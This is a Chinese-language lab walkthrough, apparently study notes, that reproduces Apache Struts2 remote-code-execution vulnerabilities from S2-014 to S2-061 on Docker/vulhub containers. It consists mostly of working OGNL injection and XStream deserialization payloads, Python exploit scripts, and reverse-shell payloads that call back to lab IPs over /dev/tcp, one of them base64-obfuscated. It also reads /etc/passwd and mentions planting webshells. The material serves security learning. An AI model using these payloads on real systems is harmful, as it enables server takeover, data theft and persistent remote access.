S2-014\n\n```\n/link.action?xxxx=%24%7B%28%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%29%28%23_memberAccess%5B%27allowStaticMethodAccess%27%5D%3Dtrue%29%28@java.lang.Runtime@getRuntime%28%29.exec%28%22open%20%2fApplications%2fCalculator.app%22%29%29%7D\n```\n\n\n\n### S2-015\n\n#### 漏洞复现\n\n\n\n![image-20210512214004842](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210512214004842.png)\n\n#### 漏洞验证\n\n#### Poc-1\n\n```\n${#context['xwork.MethodAccessor.denyMethodExecution']=false,#m=#_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),#m.setAccessible(true),#m.set(#_memberAccess,true),#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id').getInputStream()),#q}.action\n```\n\n\n\n\n\n![image-20210512215710691](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210512215710691.png)\n\n\n\n#### Poc-2\n\n```\n${#context[‘xwork.MethodAccessor.denyMethodExecution’]=false,#m=#_memberAccess.getClass().getDeclaredField(‘allowStaticMethodAccess’),#m.setAccessible(true),#m.set(#_memberAccess,true),#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(‘ls’).getInputStream()),#q}.action\n```\n\n### S2-016\n\n#### 漏洞搭建\n\n这边不用vulhub环境进行复现了\n\n有点小问题\n\n\n\n```\nsudo docker pull medicean/vulapps:s_struts2_s2-016 #拉取\nsudo docker run -d -p 8888:8080 medicean/vulapps:s_struts2_s2-016 #开启\nsudo docker ps\n```\n\n![image-20210512222251152](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210512222251152.png)\n\n\n\n#### 漏洞复现\n\n成功访问\n\n![image-20210512222306781](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210512222306781.png)\n\n#### 漏洞验证\n\n#### Poc-1-获取ID\n\n```\n/default.action?redirect:%24%7B%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%2C%23f%3D%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29%2C%23f.setAccessible%28true%29%2C%23f.set%28%23_memberAccess%2Ctrue%29%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27id%27%29.getInputStream%28%29%29%7D\n```\n\n\n\n![image-20210512222330562](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210512222330562.png)\n\n#### POC-2-获取网页目录\n\n进行抓包\n\n```\n/default.action?redirect:${#req=#context.get('co'+'m.open'+'symphony.xwo'+'rk2.disp'+'atcher.HttpSer'+'vletReq'+'uest'),#resp=#context.get('co'+'m.open'+'symphony.xwo'+'rk2.disp'+'atcher.HttpSer'+'vletRes'+'ponse'),#resp.setCharacterEncoding('UTF-8'),#ot=#resp.getWriter (),#ot.print('web'),#ot.print('path:'),#ot.print(#req.getSession().getServletContext().getRealPath('/')),#ot.flush(),#ot.close()}\n```\n\n\n\n![image-20210512222843876](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210512222843876.png)\n\n进行URL编码\n\n\n\n![image-20210512222858437](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210512222858437.png)\n\n\n\n#### Poc3-执行uname-a\n\n进行抓包\n\n```\n/default.action?redirect:${#context[\"xwork.MethodAccessor.denyMethodExecution\"]=false,#f=#_memberAccess.getClass().getDeclaredField(\"allowStaticMethodAccess\"),#f.setAccessible(true),#f.set(#_memberAccess,true),#a=@java.lang.Runtime@getRuntime().exec(\"uname -a\").getInputStream(),#b=new java.io.InputStreamReader(#a),#c=new java.io.BufferedReader(#b),#d=new char[5000],#c.read(#d),#genxor=#context.get(\"com.opensymphony.xwork2.dispatcher.HttpServletResponse\").getWriter(),#genxor.println(#d),#genxor.flush(),#genxor.close()}\n```\n\n\n\n进行URL编码\n\n\n\n![image-20210512223020831](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210512223020831.png)\n\n\n\n![image-20210512223011633](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210512223011633.png)\n\n\n\n### S2-019\n\n\n\n#### 漏洞搭建\n\n同样是需要本地搭建的\n\n```\nsudo docker pull medicean/vulapps:s_struts2_s2-019 # 拉取\nsudo docker run -d -p 8888:8080 medicean/vulapps:s_struts2_s2-019 #启动\nsudo docker ps\n```\n\n![image-20210512224014425](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210512224014425.png)\n\n\n\n#### 漏洞复现\n\n成功访问\n\n![image-20210512224000656](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210512224000656.png)\n\n#### Poc\n\n进行抓包\n\n```\n?debug=command&expression=#a=(new java.lang.ProcessBuilder('id')).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#out=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),#out.getWriter().println('dbapp:'+new java.lang.String(#e)),#out.getWriter().flush(),#out.getWriter().close()\n```\n\n进行URL编码\n\n![image-20210512223900029](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210512223900029.png)\n\n\n\n```\n%64%65%62%75%67=%63%6f%6d%6d%61%6e%64&%65%78%70%72%65%73%73%69%6f%6e=%23%61%3d%28%6e%65%77%20%6a%61%76%61%2e%6c%61%6e%67%2e%50%72%6f%63%65%73%73%42%75%69%6c%64%65%72%28%27%69%64%27%29%29%2e%73%74%61%72%74%28%29%2c%23%62=%23%61%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29%2c%23%63=%6e%65%77%20%6a%61%76%61%2e%69%6f%2e%49%6e%70%75%74%53%74%72%65%61%6d%52%65%61%64%65%72%28%23%62%29%2c%23%64%3d%6e%65%77%20%6a%61%76%61%2e%69%6f%2e%42%75%66%66%65%72%65%64%52%65%61%64%65%72%28%23%63%29%2c%23%65=%6e%65%77%20%63%68%61%72%5b%35%30%30%30%30%5d%2c%23%64%2e%72%65%61%64%28%23%65%29%2c%23%6f%75%74=%23%63%6f%6e%74%65%78%74%2e%67%65%74%28%27%63%6f%6d%2e%6f%70%65%6e%73%79%6d%70%68%6f%6e%79%2e%78%77%6f%72%6b%32%2e%64%69%73%70%61%74%63%68%65%72%2e%48%74%74%70%53%65%72%76%6c%65%74%52%65%73%70%6f%6e%73%65%27%29%2c%23%6f%75%74%2e%67%65%74%57%72%69%74%65%72%28%29%2e%70%72%69%6e%74%6c%6e%28%27%64%62%61%70%70%3a%27%2b%6e%65%77%20%6a%61%76%61%2e%6c%61%6e%67%2e%53%74%72%69%6e%67%28%23%65%29%29%2c%23%6f%75%74%2e%67%65%74%57%72%69%74%65%72%28%29%2e%66%6c%75%73%68%28%29%2c%23%6f%75%74%2e%67%65%74%57%72%69%74%65%72%28%29%2e%63%6c%6f%73%65%28%29\n```\n\n\n\n![image-20210512225245545](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210512225245545.png)\n\n\n\n#### 工具\n\n![image-20210513165124031](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210513165124031.png)\n\n\n\n### S2-029\n\n#### 漏洞搭建\n\n```\nsudo docker pull medicean/vulapps:s_struts2_s2-029\nsudo docker run -d -p 8888:8080 medicean/vulapps:s_struts2_s2-029\nsudo docker ps\n```\n\n\n\n![image-20210513165541167](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210513165541167.png)\n\n\n\n#### 漏洞复现\n\n\n\n这边访问有需要的话 清除一下浏览器的记录\n\n成功访问\n\n\n\n![image-20210513165648905](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210513165648905.png)\n\n#### 漏洞验证\n\n#### Poc\n\n```\n/default.action?message=(%23_memberAccess['allowPrivateAccess']=true,%23_memberAccess['allowProtectedAccess']=true,%23_memberAccess['excludedPackageNamePatterns']=%23_memberAccess['acceptProperties'],%23_memberAccess['excludedClasses']=%23_memberAccess['acceptProperties'],%23_memberAccess['allowPackageProtectedAccess']=true,%23_memberAccess['allowStaticMethodAccess']=true,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('whoami').getInputStream()))\n```\n\n\n\n![image-20210513165853588](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210513165853588.png)\n\n\n\n![image-20210513170043670](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210513170043670.png)\n\n\n\n### S2-032\n\n\n\n#### 漏洞搭建\n\n使用vulhub 就可以\n\n一样的搭建方法\n\n![image-20210513170613927](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210513170613927.png)\n\n\n\n#### 漏洞复现\n\n\n\n![image-20210513170740940](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210513170740940.png)\n\n\n\n#### 漏洞验证\n\n#### Poc-1\n\n```\n/memoindex.action?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23context[%23parameters.obj[0]].getWriter().print(%23parameters.content[0]%2b602%2b53718),1?%23xx:%23request.toString&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=10010\n```\n\n\n\n![image-20210513170758210](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210513170758210.png)\n\n\n\n返回则代表可以代码执行\n\n```\n1001060253718\n```\n\n\n\n#### Poc-2\n\n```\n/index.action?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.pp%5B0%5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&pp=%5C%5CA&ppp=%20&encoding=UTF-8&cmd=id\n```\n\n\n\n![image-20210513170928746](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210513170928746.png)\n\n### S2-045\n\n#### 漏洞搭建\n\n\n\n![image-20210513171306516](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210513171306516.png)\n\n\n\n#### 漏洞复现\n\n\n\n![image-20210513171324276](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210513171324276.png)\n\n\n\n#### 漏洞验证\n\n#### Poc\n\n进行抓包\n\n\n\n```\n%{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(#ros.println(100*500)).(#ros.flush())}\n```\n\n\n\n![image-20210513171637684](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210513171637684.png)\n\n#### 工具\n\nvulmap.py\n\n### S2-046\n\n#### 漏洞搭建\n\n![image-20210513173902831](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210513173902831.png)\n\n\n\n#### 漏洞复现\n\n\n\n![image-20210513173935974](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210513173935974.png)\n\n\n\n#### 漏洞验证\n\n#### Poc-1\n\n进行抓包 在filename处进行修改\n\n\n\n```\n%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Test',1+99)}\\x00b\n```\n\n\n\n![image-20210513174153179](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210513174153179.png)\n\n\n\n\n\n进行00截断\n\n\n\n![image-20210513174446580](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210513174446580.png)\n\n\n\n![image-20210513174507491](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210513174507491.png)\n\n\n\n执行一下\n\n\n\n![image-20210513174528186](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210513174528186.png)\n\n\n\n#### Poc-2 直接反弹shell\n\n\n\n```\n\"%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='bash -i >& /dev/tcp/192.168.175.130/6666 0>&1').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())} b\"\n```\n\n\n\n![image-20210513175535707](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210513175535707.png)\n\n\n\n同样是要进行00截断\n\n\n\n![image-20210513175632749](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210513175632749.png)\n\n\n\n![image-20210513175651260](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210513175651260.png)\n\n\n\n成功上线\n\n\n\n![image-20210513175714874](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210513175714874.png)\n\n\n\n### S2-048\n\n#### 漏洞搭建\n\n![image-20210513180107412](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210513180107412.png)\n\n\n\n#### 漏洞复现\n\n```\nhttp://192.168.175.209:8080/integration/editGangster.action\n```\n\n\n\n![image-20210513180456874](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210513180456874.png)\n\n\n\n#### 漏洞验证\n\n#### Poc-1\n\n在Gangster Name框 进行操作\n\n\n\n```\n%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id').getInputStream())).(#q)}\n```\n\n![image-20210513180653424](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210513180653424.png)\n\n#### Poc-2 直接反弹shell\n\n\n\n![image-20210513181210797](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210513181210797.png)\n\n\n\n```\n%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='bash -i >& /dev/tcp/192.168.175.130/6666 0>&1').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\n```\n\n\n\n![image-20210513181236966](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210513181236966.png)\n\n\n\n\n\n### S2-052\n\n#### 漏洞搭建\n\n![image-20210513181543201](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210513181543201.png)\n\n\n\n#### 漏洞复现\n\n```\nhttp://192.168.175.209:8080/orders/3/edit\n```\n\n\n\n这个插件下的漏洞\n\n\n\n![image-20210513181648498](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210513181648498.png)\n\n\n\n#### 漏洞验证\n\n#### Poc-1\n\n进行抓包\n\n\n\n```\n<map>\n <entry>\n <jdk.nashorn.internal.objects.NativeString>\n <flags>0</flags>\n <value class=\"com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data\">\n <dataHandler>\n <dataSource class=\"com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource\">\n <is class=\"javax.crypto.CipherInputStream\">\n <cipher class=\"javax.crypto.NullCipher\">\n <initialized>false</initialized>\n <opmode>0</opmode>\n <serviceIterator class=\"javax.imageio.spi.FilterIterator\">\n <iter class=\"javax.imageio.spi.FilterIterator\">\n <iter class=\"java.util.Collections$EmptyIterator\"/>\n <next class=\"java.lang.ProcessBuilder\">\n <command>\n <string>touch</string>\n <string>/tmp/success</string>\n </command>\n <redirectErrorStream>false</redirectErrorStream>\n </next>\n </iter>\n <filter class=\"javax.imageio.ImageIO$ContainsFilter\">\n <method>\n <class>java.lang.ProcessBuilder</class>\n <name>start</name>\n <parameter-types/>\n </method>\n <name>foo</name>\n </filter>\n <next class=\"string\">foo</next>\n </serviceIterator>\n <lock/>\n </cipher>\n <input class=\"java.lang.ProcessBuilder$NullInputStream\"/>\n <ibuffer></ibuffer>\n <done>false</done>\n <ostart>0</ostart>\n <ofinish>0</ofinish> <closed>false</closed>\n </is>\n <consumed>false</consumed>\n </dataSource>\n <transferFlavors/>\n </dataHandler>\n <dataLen>0</dataLen>\n </value>\n </jdk.nashorn.internal.objects.NativeString>\n <jdk.nashorn.internal.objects.NativeString reference=\"../jdk.nashorn.internal.objects.NativeString\"/>\n </entry>\n <entry>\n <jdk.nashorn.internal.objects.NativeString reference=\"../../entry/jdk.nashorn.internal.objects.NativeString\"/>\n <jdk.nashorn.internal.objects.NativeString reference=\"../../entry/jdk.nashorn.internal.objects.NativeString\"/>\n </entry>\n</map>\n```\n\n\n\n\n\n修改类型  执行Poc\n\n\n\n```\nContent-Type: application/xml\n```\n\n\n\n\n\n![image-20210513182209779](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210513182209779.png)\n\n\n\n命令执行的代码 在这里\n\n\n\n![image-20210513182327874](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210513182327874.png)\n\n\n\n进行执行之后 返回500\n\n\n\n去docker底层看一下 是否创建成功\n\n\n\n可以看到是成功的\n\n\n\n![image-20210513182621783](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210513182621783.png)\n\n\n\n#### Poc-2\n\n同样我们可以 执行其他操作 写到command中\n\n```\n读文件\n<command> <string>cp</string> <string>/etc/passwd</string> <string>/tmp/passwd</string> </command>\n\n\n写文件 上线webshell，都是可以的\n<command>\n<string>bash</string>\n<string>-c</string>\n<string>echo a001 hello > /tmp/a001.txt</string>\n</command>\n```\n\n\n\n![image-20210513182956474](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210513182956474.png)\n\n\n\n可以看到都是成功的\n\n\n\n\n\n![image-20210513183119151](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210513183119151.png)\n\n\n\n### S2-053\n\n#### 影响版本\n\n```\nStruts 2.0.1-2.3.33\nStruts 2.5-2.5.10\n```\n\n#### 漏洞搭建\n\n```\ncd vulhub-master/struts2/s2-053\nsudo docker-compose up -d\n```\n\n![image-20210519125751725](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210519125751725.png)\n\n\n\n#### 漏洞复现\n\n#### 漏洞验证\n\n访问一下\n\n```\nhttp://192.168.175.209:8080/hello.action\n```\n\n\n\n![image-20210519125809543](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210519125809543.png)\n\n进行抓包\n\n\n\n![image-20210519125839686](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210519125839686.png)\n\n\n\n#### Poc-1\n\n\n\n```\nredirectUri=%25%7B%28%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%29.%28%23_memberAccess%3F%28%23_memberAccess%3D%23dm%29%3A%28%28%23container%3D%23context%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ognlUtil%3D%23container.getInstance%28%40com.opensymphony.xwork2.ognl.OgnlUtil%40class%29%29.%28%23context.setMemberAccess%28%23dm%29%29%29%29.%28%23cmds%3D%28%7B%27%2Fbin%2Fbash%27%2C%27-c%27%2C%27id%27%7D%29%29.%28%23p%3Dnew+java.lang.ProcessBuilder%28%23cmds%29%29.%28%23process%3D%23p.start%28%29%29.%28%40org.apache.commons.io.IOUtils%40toString%28%23process.getInputStream%28%29%29%29%7D%0A\n```\n\n\n\n![image-20210519125934561](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210519125934561.png)\n\n\n\n#### Poc-2-反弹shell\n\n```\n%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='bash -i >& /dev/tcp/192.168.253.27/8889 0>&1').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}\n```\n\n\n\n![image-20210519130247148](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210519130247148.png)\n\n\n\n### S2-057\n\n#### 影响版本\n\n```\nStruts 2.3–2.3.34\nStruts2.5–2.5.16\n```\n\n#### 漏洞搭建\n\n```\ncd vulhub-master/struts2/s2-057\nsudo docker-compose up -d\n```\n\n\n\n![image-20210519133746022](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210519133746022.png)\n\n\n\n#### 漏洞复现\n\n访问一下\n\n\n\n```\nhttp://192.168.175.209:8080/index\n```\n\n\n\n![image-20210519133838887](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210519133838887.png)\n\n#### 漏洞验证\n\n进行抓包\n\n\n\n```\n/%24%7B%28%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28%40com.opensymphony.xwork2.ognl.OgnlUtil%40class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23a%3D%40java.lang.Runtime%40getRuntime%28%29.exec%28%27id%27%29%29.%28%40org.apache.commons.io.IOUtils%40toString%28%23a.getInputStream%28%29%29%29%7D/actionChain1.action\n```\n\n\n\n![image-20210519134043102](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210519134043102.png)\n\n\n\n\n\n### S2-059\n\n#### 影响版本\n\n```\nStruts 2.0.0 - Struts 2.5.20\n```\n\n#### 漏洞搭建\n\n```\ncd vulhub-master/struts2/s2-059\nsudo docker-compose up -d\n```\n\n\n\n\n\n\n\n![image-20210519141538531](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210519141538531.png)\n\n#### 漏洞复现\n\n访问一下\n\n```\nhttp://192.168.175.130:8080/?id=1\n```\n\n\n\n![image-20210519141813799](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210519141813799.png)\n\n\n\n#### 漏洞验证\n\n```\nhttp://192.168.175.130:8080/?id=%25{100*500}\n```\n\n\n\n开F12进行查看 可以看到它成功执行了\n\n\n\n![image-20210519141945199](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210519141945199.png)\n\n\n\n\n\n#### Poc-1\n\n```\nid=%25%7b%23_memberAccess.allowPrivateAccess%3Dtrue%2C%23_memberAccess.allowStaticMethodAccess%3Dtrue%2C%23_memberAccess.excludedClasses%3D%23_memberAccess.acceptProperties%2C%23_memberAccess.excludedPackageNamePatterns%3D%23_memberAccess.acceptProperties%2C%23res%3D%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2C%23a%3D%40java.lang.Runtime%40getRuntime()%2C%23s%3Dnew%20java.util.Scanner(%23a.exec('id').getInputStream()).useDelimiter('%5C%5C%5C%5CA')%2C%23str%3D%23s.hasNext()%3F%23s.next()%3A''%2C%23res.print(%23str)%2C%23res.close()%0A%7d\n```\n\n\n\n#### Poc-2\n\n附上一个py2的脚本\n\n\n\n![image-20210519142957153](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210519142957153.png)\n\n\n\n```\nimport requests\nurl = \"http://192.168.175.130:8080\"\ndata1 = {\n \"id\": \"%{(#context=#attr['struts.valueStack'].context).(#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.setExcludedClasses('')).(#ognlUtil.setExcludedPackageNames(''))}\"}\ndata2 = {\n \"id\": \"%{(#context=#attr['struts.valueStack'].context).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(@java.lang.Runtime@getRuntime().exec('touch /tmp/success'))}\"\n}\nres1 = requests.post(url, data=data1)\n# print(res1.text)\nres2 = requests.post(url, data=data2)\n# print(res2.text)\n```\n\n\n\n一个是对方的IP 一个是执行的命令\n\n\n\n![image-20210519143037882](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210519143037882.png)\n\n\n\n\n\n没有requsets依赖的\n\n\n\n```\npip install requests\n```\n\n\n\n\n\n\n\n![image-20210519144401518](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210519144401518.png)\n\n\n\n\n\n然后去docker底层看一下\n\n\n\n![image-20210519144629755](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210519144629755.png)\n\n\n\n可以看到是成功创建的\n\n\n\n#### Poc-3-上线webshell\n\n\n\n```\nhttp://www.jackson-t.ca/runtime-exec-payloads.html\n要进行转码\nbash -i >& /dev/tcp/192.168.175.130/8888 0>&1\nbash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3NS4xMzAvODg4OCAwPiYx}|{base64,-d}|{bash,-i}\n```\n\n\n\n![image-20210519144858526](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210519144858526.png)\n\n\n\n最后的Poc\n\n```\nimport requests\nurl = \"http://192.168.175.130:8080\"\ndata1 = {\n \"id\": \"%{(#context=#attr['struts.valueStack'].context).(#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.setExcludedClasses('')).(#ognlUtil.setExcludedPackageNames(''))}\"\n}\ndata2 = {\n \"id\": \"%{(#context=#attr['struts.valueStack'].context).(#context.setMemberAccess(@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)).(@java.lang.Runtime@getRuntime().exec('bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3NS4xMzAvODg4OCAwPiYx}|{base64,-d}|{bash,-i}'))}\"\n}\nres1 = requests.post(url, data=data1)\n# print(res1.text)\nres2 = requests.post(url, data=data2)\n# print(res2.text)\n```\n\n\n\n![image-20210519145130229](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210519145130229.png)\n\n\n\n![image-20210519145202710](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210519145202710.png)\n\n\n\n\n\n成功拿到反弹shell\n\n\n\n![image-20210519145247712](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210519145247712.png)\n\n\n\n\n\n### S2-061\n\n#### 影响版本\n\n```\nStruts 2.0.0 - Struts 2.5.25\n```\n\n#### 漏洞搭建\n\n```\ncd vulhub-master/struts2/s2-061\nsudo docker-compose up -d\n```\n\n\n\n![image-20210519150843795](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210519150843795.png)\n\n\n\n#### 漏洞复现\n\n访问\n\n```\nhttp://192.168.175.130:8080/index.action\n```\n\n\n\n![image-20210519150910881](https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210519150910881.png)\n\n\n\n#### 漏洞验证\n\n\n\n进行抓包\n\n#### Poc-1\n\n```\nPOST /index.action HTTP/1.1\nHost: 192.168.175.130:8080\nAccept-Encoding: gzip, deflate\nAccept: */*\nAccept-Language: en\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36\nConnection: close\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryl7d1B1aGsV2wcZwF\nContent-Length: 829\n\n------WebKitFormBoundaryl7d1B1aGsV2wcZwF\nContent-Disposition: form-data; 